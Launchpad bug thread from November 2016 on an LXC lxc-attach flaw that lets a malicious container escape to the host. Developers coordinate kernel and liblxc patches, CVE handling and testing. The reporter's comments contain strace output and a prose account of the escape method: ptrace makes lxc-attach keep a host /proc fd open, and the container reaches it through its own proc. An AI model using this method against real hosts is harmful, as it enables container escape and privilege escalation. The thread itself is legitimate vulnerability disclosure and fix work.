As for the kernel side of this, I believe Eric Biederman is aware of this particular problem and looking into options to restrict ptrace of processes crossing userns boundaries.

As for the kernel side of this, I believe Eric Biederman is aware of this particular problem and looking into options to restrict ptrace of processes crossing userns boundaries.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-04: |  |  | [#5](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/5) |
| --- | --- | --- | --- |

A workaround we're now considering for the ptrace issue is to have attach() call ptrace on itself, therefore preventing any other program from ptracing it (since you can't ptrace something that's being ptraced).

A workaround we're now considering for the ptrace issue is to have attach() call ptrace on itself, therefore preventing any other program from ptracing it (since you can't ptrace something that's being ptraced).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-05: |  |  | [#6](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/6) |
| --- | --- | --- | --- |

I've been working on the ptrace fix and so far I haven't found a non-racy version of this. Even in the case where it blocks the ptrace from inside the container we end up in interruptible sleep and hang forever on waitpid().

I've been working on the ptrace fix and so far I haven't found a non-racy version of this. Even in the case where it blocks the ptrace from inside the container we end up in interruptible sleep and hang forever on waitpid().

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-05: |  |  | [#7](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/7) |
| --- | --- | --- | --- |

Hi Roman, can you please explain the details of your exploit in more detail; e.g. how you were preparing fd=7. The ptrace part is reproducible but I'm not sure that we can reliably prevent this without fixing this in the kernel. The second part, opening a prepared fd I can't seem to reproduce but maybe I'm just missing some crucial details. It would be good if you could outline the exact steps needed to reproduce this issue.

Hi Roman, can you please explain the details of your exploit in more detail; e.g. how you were preparing fd=7. The ptrace part is reproducible but I'm not sure that we can reliably prevent this without fixing this in the kernel. The second part, opening a prepared fd I can't seem to reproduce but maybe I'm just missing some crucial details. It would be good if you could outline the exact steps needed to reproduce this issue.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-06: |  |  | [#8](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/8) |
| --- | --- | --- | --- |

I was chatting with Eric yesterday and he mentioned this patch in his next branch which may address the ptrace issue from the kernel point of view (which would make this a kernel security issue):

<https://git.kernel.org/cgit/linux/kernel/git/ebiederm/user-namespace.git/commit/?h=for-next&id=2e41414828bb0b066bde2f156cfa848c38531edf>

It'd be good if someone could build a kernel with this patch applied and see if this resolves the ptrace issue.

I was chatting with Eric yesterday and he mentioned this patch in his next branch which may address the ptrace issue from the kernel point of view (which would make this a kernel security issue):
https://git.kernel.org/cgit/linux/kernel/git/ebiederm/user-namespace.git/commit/?h=for-next&id=2e41414828bb0b066bde2f156cfa848c38531edf
It'd be good if someone could build a kernel with this patch applied and see if this resolves the ptrace issue.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Roman Fiedler (roman-fiedler-deactivatedaccount)](https://launchpad.net/~roman-fiedler-deactivatedaccount) wrote on 2016-11-07: |  |  | [#9](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/9) |
| --- | --- | --- | --- |

@Christian Brauner (comment #7):

> can you please explain the details of your exploit in more detail; e.g. how you were preparing fd=7.

The fd=7 is just the directory-fd pointing to /proc/[pid] on the HOST. It seems that lxc-attach keeps it open to access the host side /proc/[pid] resources even after setns().

If you do a "strace -s256 -f screen lxc-attch -n name" (without your self-ptrace patch), you can find following calls:

# This is still in initns, here the fd=7 is created. The number might be different for SSH logins, screen session, bash vs other shell ....

[pid 1712] open("/proc", O\_RDONLY|O\_DIRECTORY) = 7

... immediately afterwards

[pid 1712] open("/proc/1632/ns/user", O\_RDONLY|O\_CLOEXEC) = 9

[pid 1712] open("/proc/1632/ns/mnt", O\_RDONLY|O\_CLOEXEC) = 10

...

# now use the ns-fds, thus changing the root to reside in container

[pid 1712] setns(9, 0) = 0

[pid 1712] close(9) = 0

[pid 1712] setns(10, 0) = 0

...

# later on after changing to guest-ns uid=0, the fd is used.

[pid 1713] openat(7, "self/attr/current", O\_RDWR) = 8

[pid 1713] write(8, "changeprofile lxc-container-default-cgns\0", 41) = 41

The ptrace part just makes lxc-attach close the wrong file descriptor (not 7) before executing the guest command (/bin/sh), thus giving access to the open fd=7 via guest proc filesystem.

A full, failsafe exploit should try to infere the correct fd-number to search for or use the fixed stack offsets, they seem to be quite reliable.

@Christian Brauner (comment #7):
> can you please explain the details of your exploit in more detail; e.g. how you were preparing fd=7.
The fd=7 is just the directory-fd pointing to /proc/[pid] on the HOST. It seems that lxc-attach keeps it open to access the host side /proc/[pid] resources even after setns().
If you do a "strace -s256 -f screen lxc-attch -n name" (without your self-ptrace patch), you can find following calls:
# This is still in initns, here the fd=7 is created. The number might be different for SSH logins, screen session, bash vs other shell ....
[pid 1712] open("/proc", O\_RDONLY|O\_DIRECTORY) = 7
... immediately afterwards
[pid 1712] open("/proc/1632/ns/user", O\_RDONLY|O\_CLOEXEC) = 9
[pid 1712] open("/proc/1632/ns/mnt", O\_RDONLY|O\_CLOEXEC) = 10
...
# now use the ns-fds, thus changing the root to reside in container
[pid 1712] setns(9, 0) = 0
[pid 1712] close(9) = 0
[pid 1712] setns(10, 0) = 0
...
# later on after changing to guest-ns uid=0, the fd is used.
[pid 1713] openat(7, "self/attr/current", O\_RDWR) = 8
[pid 1713] write(8, "changeprofile lxc-container-default-cgns\0", 41) = 41
The ptrace part just makes lxc-attach close the wrong file descriptor (not 7) before executing the guest command (/bin/sh), thus giving access to the open fd=7 via guest proc filesystem.
A full, failsafe exploit should try to infere the correct fd-number to search for or use the fixed stack offsets, they seem to be quite reliable.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-07: |  |  | [#10](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/10) |
| --- | --- | --- | --- |

Ok, so for the second part, preventing the /proc attack. We need the procfd to the host's namespace so that we can set the lsm label later on in attach\_child\_main(). The obvious solution that we've shortly discussed at Plumbers is to mount a fresh proc in a new mount and pid namespace. However, we cannot simply unshare(CLONE\_NEWNS|CLONE\_NEWPID) and then umount /proc since we then are not really part of the pid namespace and that leads to all sorts of complications. You can try that out with

unshare -Ump --mount-proc -- sh

mounting a fresh /proc seems to only work correctly if you fork()/clone() first. That's why I suspect that the cleanest solution is to create a minimal namespace (similar to the lxcfs solution), mount /proc in there and then open an fd to that. In essence, this would mean that we would have to lxc\_clone(chroot\_us\_and\_clone\_again, ..., CLONE\_PARENT) in and chroot us, and then call lxc\_clone(attach\_child\_main, &payload, CLONE\_PARENT) within chroot\_us\_and\_clone\_again() to exec the actual process we want to run in the container. We would effectively create an additional 4th process in attach. This \*could\* work: Due to CLONE\_PARENT both processes should have the same parent and we should be able to selectively wait on our chroot\_us\_and\_clone\_again() child in lxc\_attach() while handing back the PID of the exec'ing process back to our caller. So that when someone straces us and finds a way to escape to the namespace of lxc\_attach() he would effectively find himself safely chrooted.

Ok, so for the second part, preventing the /proc attack. We need the procfd to the host's namespace so that we can set the lsm label later on in attach\_child\_main(). The obvious solution that we've shortly discussed at Plumbers is to mount a fresh proc in a new mount and pid namespace. However, we cannot simply unshare(CLONE\_NEWNS|CLONE\_NEWPID) and then umount /proc since we then are not really part of the pid namespace and that leads to all sorts of complications. You can try that out with
unshare -Ump --mount-proc -- sh
mounting a fresh /proc seems to only work correctly if you fork()/clone() first. That's why I suspect that the cleanest solution is to create a minimal namespace (similar to the lxcfs solution), mount /proc in there and then open an fd to that. In essence, this would mean that we would have to lxc\_clone(chroot\_us\_and\_clone\_again, ..., CLONE\_PARENT) in and chroot us, and then call lxc\_clone(attach\_child\_main, &payload, CLONE\_PARENT) within chroot\_us\_and\_clone\_again() to exec the actual process we want to run in the container. We would effectively create an additional 4th process in attach. This \*could\* work: Due to CLONE\_PARENT both processes should have the same parent and we should be able to selectively wait on our chroot\_us\_and\_clone\_again() child in lxc\_attach() while handing back the PID of the exec'ing process back to our caller. So that when someone straces us and finds a way to escape to the namespace of lxc\_attach() he would effectively find himself safely chrooted.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Roman Fiedler (roman-fiedler-deactivatedaccount)](https://launchpad.net/~roman-fiedler-deactivatedaccount) wrote on 2016-11-08: |  |  | [#11](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/11) |
| --- | --- | --- | --- |

OK, but sounds complicated.

I'm not sure if that could work, but what about...

\* Create a helper mount namespace from init-ns where everything needed after setns(guestns) is bind-mounted and where everything else is unmounted. Not sure if chroot/pivot\_root would be needed here to cleanup.

\* Open a directory fd to the root of this helper mountns

\* Enter the final user/mount ns as implemented now. This should work even when guest-ns is not parent of helper-ns as process is privileged in init-ns (not 100% sure about that). The helper-ns would not be the mount ns of any living process any more and should be purged, when the directory fd is closed.

\* After entering the guestns process has only limited means to modify the content in the helper-ns as it does not live in the parent-ns of the helper-ns.

Could that be a generic concept to get around the sequence of clone() calls?

OK, but sounds complicated.
I'm not sure if that could work, but what about...
\* Create a helper mount namespace from init-ns where everything needed after setns(guestns) is bind-mounted and where everything else is unmounted. Not sure if chroot/pivot\_root would be needed here to cleanup.
\* Open a directory fd to the root of this helper mountns
\* Enter the final user/mount ns as implemented now. This should work even when guest-ns is not parent of helper-ns as process is privileged in init-ns (not 100% sure about that). The helper-ns would not be the mount ns of any living process any more and should be purged, when the directory fd is closed.
\* After entering the guestns process has only limited means to modify the content in the helper-ns as it does not live in the parent-ns of the helper-ns.
Could that be a generic concept to get around the sequence of clone() calls?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-08: |  |  | [#12](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/12) |
| --- | --- | --- | --- |

Maybe, but what I was worried about with this solution is that you still have /proc mounted and a process that escapes to the helper NS could then access restricted information from the init PIDNS by e.g. parsing /proc via readdir(). It's possible that I'm overthinking this though.

Maybe, but what I was worried about with this solution is that you still have /proc mounted and a process that escapes to the helper NS could then access restricted information from the init PIDNS by e.g. parsing /proc via readdir(). It's possible that I'm overthinking this though.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Roman Fiedler (roman-fiedler-deactivatedaccount)](https://launchpad.net/~roman-fiedler-deactivatedaccount) wrote on 2016-11-08: |  |  | [#13](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/13) |
| --- | --- | --- | --- |

Well, I would not keep the whole /proc open but only the /proc/[pid] and perhaps single files from other /proc parts if needed. Then only problematic parts are root, exec, cwd, ... but after chroot those should be the same as inside the guest?

Well, I would not keep the whole /proc open but only the /proc/[pid] and perhaps single files from other /proc parts if needed. Then only problematic parts are root, exec, cwd, ... but after chroot those should be the same as inside the guest?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-08:  [**Re: [Bug 1639345] Re: lxc-attach to malicious container allows access to host**](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/14) |  |  | [#14](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/14) |
| --- | --- | --- | --- |

The problem is that we don't know the PID of the attached process

beforehand, so we need to keep an fd for a clean /proc open and then

do open(/proc/self/attrc/current) and so on.

The problem is that we don't know the PID of the attached process
beforehand, so we need to keep an fd for a clean /proc open and then
do open(/proc/self/attrc/current) and so on.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Roman Fiedler (roman-fiedler-deactivatedaccount)](https://launchpad.net/~roman-fiedler-deactivatedaccount) wrote on 2016-11-08: |  |  | [#15](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/15) |
| --- | --- | --- | --- |

Damn, that is bad. I missed this one.

Other idea: the control process stays outside the setns() and knows the PID of the child, right? Could that process open the file and send the content as message via the shared command socket? Seems less intrusive to me than adding more clone()s in the chain from control process to guest process?

Damn, that is bad. I missed this one.
Other idea: the control process stays outside the setns() and knows the PID of the child, right? Could that process open the file and send the content as message via the shared command socket? Seems less intrusive to me than adding more clone()s in the chain from control process to guest process?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-08: |  |  | [#16](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/16) |
| --- | --- | --- | --- |

* [0001-attach-prevent-stealing-proc-fd-by-container.patch](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4774507/%2Bfiles/0001-attach-prevent-stealing-proc-fd-by-container.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4774507)
  (9.6 KiB,
  text/plain)

Hm, maybe even easier: Use IPC for the child to tell us, "set up the LSM label", then parent tells the child "LSM labels setup" and then exec the attached process. I have a patch and I'll append it here because it needs to be private. Would be great if you'd test it, Roman. :)

Hm, maybe even easier: Use IPC for the child to tell us, "set up the LSM label", then parent tells the child "LSM labels setup" and then exec the attached process. I have a patch and I'll append it here because it needs to be private. Would be great if you'd test it, Roman. :)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-08: |  |  | [#17](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/17) |
| --- | --- | --- | --- |

Eric's patch which Stéphane mentioned fixes the ptrace attack vector for me. The userspace part of stealing the /proc fd referring to /proc on the host is hopefully fixed by my patch.

Eric's patch which Stéphane mentioned fixes the ptrace attack vector for me. The userspace part of stealing the /proc fd referring to /proc on the host is hopefully fixed by my patch.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-08: |  |  | [#18](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/18) |
| --- | --- | --- | --- |

Kernel to test with Eric's patch can be found here: <http://people.canonical.com/~sforshee/for-brauner/>

Kernel to test with Eric's patch can be found here: http://people.canonical.com/~sforshee/for-brauner/

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-08: |  |  | [#19](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/19) |
| --- | --- | --- | --- |

Fwiw, the patch to liblxc I posted should be sufficient to prevent the attack. I tested this on a kernel without the ptrace fix and it seems you won't be able to escape to the host without the proc fd anymore. Waiting on Roman to confirm this.

Fwiw, the patch to liblxc I posted should be sufficient to prevent the attack. I tested this on a kernel without the ptrace fix and it seems you won't be able to escape to the host without the proc fd anymore. Waiting on Roman to confirm this.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-09: |  |  | [#20](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/20) |
| --- | --- | --- | --- |

Security team: Please assign a CVE for LXC. And please review suggested fix.

Kernel team: Please track upstream ptrace fix (will probably be worth a separate kernel CVE).

Christian: We'll need a few versions of the patch, against:

 - stable-1.0 branch

 - stable-2.0 branch (likely cherry-picks cleanly)

 - current git master (which I'm assuming is the above)

Please also do a full testsuite run on all 3 of those and confirm that there's no detected regressions.

Security team: Please assign a CVE for LXC. And please review suggested fix.
Kernel team: Please track upstream ptrace fix (will probably be worth a separate kernel CVE).
Christian: We'll need a few versions of the patch, against:
- stable-1.0 branch
- stable-2.0 branch (likely cherry-picks cleanly)
- current git master (which I'm assuming is the above)
Please also do a full testsuite run on all 3 of those and confirm that there's no detected regressions.

| Changed in lxc (Ubuntu): | |
| --- | --- |
| **status**: | New → Triaged |
| **importance**: | Undecided → Critical |
| **assignee**: | nobody → Christian Brauner (cbrauner) |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-09: |  |  | [#21](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/21) |
| --- | --- | --- | --- |

Once we all agree the suggested fix is good for this issue and we have fixes for all supported LXC releases, we can agree on a CRD and prepare packages + upstream branches for this.

Once we all agree the suggested fix is good for this issue and we have fixes for all supported LXC releases, we can agree on a CRD and prepare packages + upstream branches for this.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-09: |  |  | [#22](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/22) |
| --- | --- | --- | --- |

Ok, the fix is not yet complete since you can't change aa profile for another process. It has to do it by itself which brings the procfd passing around back into play.

Ok, the fix is not yet complete since you can't change aa profile for another process. It has to do it by itself which brings the procfd passing around back into play.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-09: |  |  | [#23](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/23) |
| --- | --- | --- | --- |

* [attach: do not send procfd to attached process](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4774931/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4774931)
  (14.5 KiB,
  text/plain)

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/23/%2Bdownload) (3.5 KiB)

I was to optimistic about the userspace fix. The fix alone might minimize the attack surface but unfortunately we seem to need the kernel fix. The child we attach in lxc-attach wants to change its LSM label appropriately right before exec() and for that it needs an fd to /proc/self/attr/current. So we seem to always have such an fd around. But what we can do is instead of passing an fd to /proc itself around, is to open up an fd to /proc/self/attr/current in the parent and send it to the child. This might minimize the attack surface but we still need the kernel fix. I post an updated version of the patch I sent before here and I'll keep thinking a little more on how we can avoid having to pass any procfd around. But I doubt it. The more complex solution I outlined above, involving a second lxc\_clone() which serves as a simple chrooting process to place is into a isolated set of namespaces is an additional attack surface minimizer. @Stéphane, do you think it be worth adding another process that chroots/minimally namspaces us before attaching to the childs namespaces?

Here's the outline of the current patch:

    So far, we opened a file descriptor refering to proc on the host inside the

    host namespace and handed that fd to the attached process in

    attach\_child\_main(). This was done to ensure that LSM labels were correctly

    setup. However, by exploiting a potential kernel bug, ptrace could be used to

    prevent the file descriptor from being closed which in turn could be used by an

    unprivileged container to gain access to the host namespace. Aside from this

    needing an upstream kernel fix, we should make sure that we don't pass the fd

    for proc itself to the attached process. However, we cannot completely prevent

    this, as the attached process needs to be able to change its apparmor profile

    by writing to /proc/self/attr/exec or /proc/self/attr/current. To minimize the

    attack surface, we only send the fd for /proc/self/attr/exec or

    /proc/self/attr/current to the attached process. To do this we introduce a

    little more IPC between the child and parent:

\* IPC mechanism: (X is receiver)

             \* initial process intermediate attached

             \* X <--- send pid of

             \* attached proc,

             \* then exit

             \* send 0 ------------------------------------> X

             \* [do initialization]

             \* X <------------------------------------ send 1

             \* [add to cgroup, ...]

             \* send 2 ------------------------------------> X

             \* [set LXC\_ATTACH\_NO\_NEW\_PRIVS]

             \* X <------------------------------------ send 3

             \* [open LSM label fd]

             \* send 4 ------------------------------------> X

             \* [set LSM label]

             \* close socket close socket

             \* ...

[Read more...](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/23)

I was to optimistic about the userspace fix. The fix alone might minimize the attack surface but unfortunately we seem to need the kernel fix. The child we attach in lxc-attach wants to change its LSM label appropriately right before exec() and for that it needs an fd to /proc/self/attr/current. So we seem to always have such an fd around. But what we can do is instead of passing an fd to /proc itself around, is to open up an fd to /proc/self/attr/current in the parent and send it to the child. This might minimize the attack surface but we still need the kernel fix. I post an updated version of the patch I sent before here and I'll keep thinking a little more on how we can avoid having to pass any procfd around. But I doubt it. The more complex solution I outlined above, involving a second lxc\_clone() which serves as a simple chrooting process to place is into a isolated set of namespaces is an additional attack surface minimizer. @Stéphane, do you think it be worth adding another process that chroots/minimally namspaces us before attaching to the childs namespaces?
Here's the outline of the current patch:
So far, we opened a file descriptor refering to proc on the host inside the
host namespace and handed that fd to the attached process in
attach\_child\_main(). This was done to ensure that LSM labels were correctly
setup. However, by exploiting a potential kernel bug, ptrace could be used to
prevent the file descriptor from being closed which in turn could be used by an
unprivileged container to gain access to the host namespace. Aside from this
needing an upstream kernel fix, we should make sure that we don't pass the fd
for proc itself to the attached process. However, we cannot completely prevent
this, as the attached process needs to be able to change its apparmor profile
by writing to /proc/self/attr/exec or /proc/self/attr/current. To minimize the
attack surface, we only send the fd for /proc/self/attr/exec or
/proc/self/attr/current to the attached process. To do this we introduce a
little more IPC between the child and parent:
\* IPC mechanism: (X is receiver)
\* initial process intermediate attached
\* X <--- send pid of
\* attached proc,
\* then exit
\* send 0 ------------------------------------> X
\* [do initialization]
\* X <------------------------------------ send 1
\* [add to cgroup, ...]
\* send 2 ------------------------------------> X
\* [set LXC\_ATTACH\_NO\_NEW\_PRIVS]
\* X <------------------------------------ send 3
\* [open LSM label fd]
\* send 4 ------------------------------------> X
\* [set LSM label]
\* close socket close socket
\* run program
The attached child tells the parent when it is ready to have its LSM labels set
up. The parent then opens an approriate fd for the child PID to
/proc/<pid>/attr/exec or /proc/<pid>/attr/current and sends it via SCM\_RIGHTS
to the child. The child can then set its LSM laben. Both sides then close the
socket fds and the child execs the requested process.

[Luis Henriques (henrix)](https://launchpad.net/~henrix)
on 2016-11-09

| Changed in linux (Ubuntu Trusty): | |
| --- | --- |
| **status**: | New → Fix Committed |
| Changed in linux (Ubuntu Vivid): | |
| **status**: | New → Fix Committed |
| Changed in linux (Ubuntu Xenial): | |
| **status**: | New → Fix Committed |
| Changed in linux (Ubuntu Yakkety): | |
| **status**: | New → Fix Committed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Johansen (jjohansen)](https://launchpad.net/~jjohansen) wrote on 2016-11-09: |  |  | [#24](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/24) |
| --- | --- | --- | --- |

The kernel patch looks good to me, and I have done a first pass through the patch from comment 23 and didn't see anything of note there.

The kernel patch looks good to me, and I have done a first pass through the patch from comment 23 and didn't see anything of note there.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Luis Henriques (henrix)](https://launchpad.net/~henrix) wrote on 2016-11-14: |  |  | [#25](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/25) |
| --- | --- | --- | --- |

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-trusty' to 'verification-done-trusty'.

If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.

See <https://wiki.ubuntu.com/Testing/EnableProposed> for documentation how to enable and use -proposed. Thank you!

This bug is awaiting verification that the kernel in -proposed solves the problem. Please test the kernel and update this bug with the results. If the problem is solved, change the tag 'verification-needed-trusty' to 'verification-done-trusty'.
If verification is not done by 5 working days from today, this fix will be dropped from the source code, and this bug will be closed.
See https://wiki.ubuntu.com/Testing/EnableProposed for documentation how to enable and use -proposed. Thank you!

| **tags**: | added: verification-needed-trusty |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-14: |  |  | [#26](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/26) |
| --- | --- | --- | --- |

@brauner: Can you attach patches for stable-1.0, stable-2.0 and current master?

@brauner: Can you attach patches for stable-1.0, stable-2.0 and current master?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-14: |  |  | [#27](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/27) |
| --- | --- | --- | --- |

@brauner: Can you also let Eric know that his patch does in fact seem to fix this security issue? That should motivate him in getting it pushed to stable sooner.

@brauner: Can you also let Eric know that his patch does in fact seem to fix this security issue? That should motivate him in getting it pushed to stable sooner.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Roman Fiedler (roman-fiedler-deactivatedaccount)](https://launchpad.net/~roman-fiedler-deactivatedaccount) wrote on 2016-11-14: |  |  | [#28](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/28) |
| --- | --- | --- | --- |

Tested with Trusty kernel

pool/main/l/linux/linux-image-3.13.0-102-generic\_3.13.0-102.149\_amd64.deb

from proposed but on Xenial test machine. Tool now aborts with

"Attach failed"

no matter what is set in /proc/sys/kernel/yama/ptrace\_scope on host.

Not sure if that Trusty/Xenial cross-release check is sufficient for verification.

The Xenial kernel from proposed does not fix the issues yet (wasn't claimed in the discussion anyway)

Tested with Trusty kernel
pool/main/l/linux/linux-image-3.13.0-102-generic\_3.13.0-102.149\_amd64.deb
from proposed but on Xenial test machine. Tool now aborts with
"Attach failed"
no matter what is set in /proc/sys/kernel/yama/ptrace\_scope on host.
Not sure if that Trusty/Xenial cross-release check is sufficient for verification.
The Xenial kernel from proposed does not fix the issues yet (wasn't claimed in the discussion anyway)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Forshee (sforshee)](https://launchpad.net/~sforshee) wrote on 2016-11-14: |  |  | [#29](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/29) |
| --- | --- | --- | --- |

@Roman: The other kernels (vivid, xenial, and yakkety) have builds with the fix in the canonical-kernel-team PPA but those builds haven't yet been copied to -proposed yet. You will see similar "This bug is awaiting verification ..." for each kernel as it reaches -proposed.

@Roman: The other kernels (vivid, xenial, and yakkety) have builds with the fix in the canonical-kernel-team PPA but those builds haven't yet been copied to -proposed yet. You will see similar "This bug is awaiting verification ..." for each kernel as it reaches -proposed.

[Joseph Salisbury (jsalisbury)](https://launchpad.net/~jsalisbury)
on 2016-11-14

| **tags**: | added: kernel-da-key |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tyler Hicks (tyhicks)](https://launchpad.net/~tyhicks) wrote on 2016-11-14: |  |  | [#30](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/30) |
| --- | --- | --- | --- |

On 11/09/2016 01:36 AM, Stéphane Graber wrote:

> Security team: Please assign a CVE for LXC. And please review suggested fix.

I think I've spotted one minor problem with the suggested fix. In

attach\_child\_main(), shutdown(ipc\_socket, SHUT\_RDWR) is not called when

lxc\_seccomp\_load() fails.

As for the CVE assignment for LXC, the Ubuntu Security Team is not

assigning CVEs at this time. Once we settle on a preferred CRD, I can

notify the linux-distros list about this issue and request a CVE at that

time.

On 11/09/2016 01:36 AM, Stéphane Graber wrote:
> Security team: Please assign a CVE for LXC. And please review suggested fix.
I think I've spotted one minor problem with the suggested fix. In
attach\_child\_main(), shutdown(ipc\_socket, SHUT\_RDWR) is not called when
lxc\_seccomp\_load() fails.
As for the CVE assignment for LXC, the Ubuntu Security Team is not
assigning CVEs at this time. Once we settle on a preferred CRD, I can
notify the linux-distros list about this issue and request a CVE at that
time.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Brauner (cbrauner)](https://launchpad.net/~cbrauner) wrote on 2016-11-15: |  |  | [#31](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/31) |
| --- | --- | --- | --- |

* [0001-attach-do-not-send-procfd-to-attached-process.patch](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4777815/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4777815)
  (14.8 KiB,
  text/plain)

Attached is a new version of the patch that adds the missing shutdown(ipc\_socket, SHUT\_RDWR) call that Tyler was pointing out.

Attached is a new version of the patch that adds the missing shutdown(ipc\_socket, SHUT\_RDWR) call that Tyler was pointing out.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-15: |  |  | [#32](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/32) |
| --- | --- | --- | --- |

Ok, so on the topic of CVE assignation, I've been going back and forth on this throughout the day.

Ultimately the security issue is with the kernel and Eric's patch fixes that, that in my mind is the real CVE worthy issue here.

On the LXC side of things, the current implementation of procfd allows an attacker to get a dirfd to the host's /proc which then allows escaping to the host's filesystem and ultimately completely escaping from the container.

Christian's fix restricts that exposure to just the apparmor label switching interface, making it still possible for an attacker in the container to alter the apparmor profile of the joining task.

That's still a security problem, but much less worse than a privileged escalation (in the case of a privileged attach process) and full container escape.

So as it stands, I think we'll want a CVE for the LXC side of this as even without the related kernel fix, the proposed fix does make things massively better by turning a privilege escalation + container escape issue into "just" an apparmor bypass issue.

As far as CRD, assuming we're all happy with the proposed fix. Anytime next week would be fine with me. If that's not an option, then the 1st or 2nd of December would work too.

